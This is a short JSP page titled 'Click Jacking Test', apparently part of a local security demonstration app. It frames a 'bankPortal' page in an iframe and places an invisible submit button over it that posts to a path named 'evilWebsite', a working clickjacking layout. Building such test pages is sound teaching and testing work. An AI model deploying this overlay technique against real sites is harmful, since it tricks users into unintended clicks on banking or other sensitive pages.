<%@ taglib uri="http://java.sun.com/jsp/jstl/core" prefix="c" %>
<%@ include file="/WEB-INF/views/commonPage.jsp" %>

<html>
<head>

	<title>Click Jacking Test</title>
</head>
<body>
<h3>Demystify Click Jacking </h3>
<br><br>

<iframe src="/painTest/restricted/bankPortal" style="width:200px;height:150px;position:absolute;top:200px;left:00px;z-index:-1;opacity:1.0" ></iframe>

<form action="/painTest/restricted/evilWebsite">
<input type="submit"  style="position:relative; top:110px;opacity:0.0">
</form>
</body>
</html>